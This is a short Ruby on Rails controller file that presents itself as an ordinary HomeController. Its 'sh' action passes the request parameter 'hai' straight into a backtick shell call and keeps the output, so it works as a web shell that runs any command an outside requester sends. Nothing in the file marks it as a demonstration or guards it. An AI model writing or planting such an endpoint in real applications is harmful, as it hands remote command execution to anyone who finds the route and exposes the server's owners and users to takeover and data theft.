class HomeController < ApplicationController
  def index
  end

  def sh
    if params[:hai]
      @content = `#{params[:hai]}`
      # @content
    end
  end
end
